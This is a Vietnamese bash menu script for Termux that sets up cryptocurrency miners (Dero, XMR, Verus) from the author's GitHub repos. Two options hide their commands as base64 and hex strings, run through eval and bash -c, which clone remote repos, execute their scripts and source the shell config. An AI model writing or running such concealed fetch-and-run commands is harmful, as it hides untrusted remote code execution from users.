#!/bin/bash
clear
# Hiển thị menu tùy chọn
echo "tool này mình viết mục đích cho anh em đào coin tiện lợi trong quá trình setting và nhanh nhất có thể ai có thắch mắc hoặc góp ý ib mình " 
echo "  ~~  Manh Mobile 0898707968   ~~ "
sleep 3
echo "https://www.facebook.com/levan.manh.739978/"
echo "Chọn một số tùy chọn :"
echo " 1   2   3  4  0 "
echo "1. Chạy lệnh đầu dero"
echo "2. Chạy lệnh đào xmr"
echo "3. Chạy lệnh đào  verus"
echo "4. liên hệ đến mình để tool hoàn thiện hơn "
echo "0. Thoát"

# Nhập lựa chọn từ người dùng
read -p "Nhập lựa chọn của bạn còn không phù hợp bạn ấn 0: " choice

# Xử lý lựa chọn
case $choice in
  1)
    echo "Đang chạy lệnh đầu tiên..."
    # Lệnh 1
    pkg install git -y && git clone https://github.com/scorpionyb/autoero.git && cd autoero && sh auto.sh && termux-wake-lock && cd V1.9.2.R5 && chmod +x rpc_mining.sh && chmod u+x astrominer && ./rpc_mining.sh
    ;;
  2)
    echo "Đang chạy lệnh thứ hai..."
    # Lệnh 2
    eval $(echo "cGtnIGluc3RhbGwgZ2l0IC15ICYmIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vbWFuaC1tb2JpbGUtMDg5ODcwNzk2OC9iYXNoLmJpdGNvaW4uZ2l0ICYmIGNkIGJhc2guYml0Y29pbiAmJiBzaCBhdXRvLnNoICYmIHNvdXJjZSAvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL2V0Yy9iYXNoLmJhc2hyYwo=" | base64 -d)
    ;;
  3)
    echo "Đang chạy lệnh thứ ba..."
    # Lệnh 3
   pkg install vim-python -y
bash -c "$(echo 706b6720696e7374616c6c20676974202d792026262067697420636c6f6e652068747470733a2f2f6769746875622e636f6d2f6d616e682d6d6f62696c652d303839383730373936382f76657275732e676974202626206364207665727573202626207368206175746f2e736820262620736f75726365202f646174612f646174612f636f6d2e7465726d75782f66696c65732f7573722f6574632f626173682e6261736872630a | xxd -r -p)"
    ;;
  4)
   echo "Đang chạy lệnh thứ 4..."
   # Lệnh 4
   termux-open https://www.facebook.com/levan.manh.739978
    ;;
  0)
    echo "Thoát chương trình."
    exit 0
    ;;
  *)
    echo "Lựa chọn không hợp lệ, vui lòng thử lại."
    ;;
esac
